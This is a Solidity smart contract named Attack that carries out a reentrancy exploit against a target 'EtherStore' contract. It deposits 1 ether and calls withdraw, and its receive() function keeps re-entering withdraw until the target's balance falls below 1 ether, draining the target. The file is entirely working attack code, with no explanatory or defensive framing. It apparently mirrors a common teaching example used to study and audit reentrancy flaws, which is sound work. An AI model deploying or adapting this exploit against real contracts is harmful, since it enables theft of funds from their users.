// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

contract Attack {
    address etherStoreAddress;

    constructor(address _etherStoreAddress) payable {
        etherStoreAddress = _etherStoreAddress;
    }

    fallback() external {}

    receive() external payable {
        if (etherStoreAddress.balance >= 1 ether) {
            etherStoreAddress.call(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );
        }
    }

    function attackEtherStore() external payable {
        etherStoreAddress.call{value: 1 ether}(
            abi.encodeWithSignature("deposit()")
        );
        etherStoreAddress.call(
            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
        );
    }
}
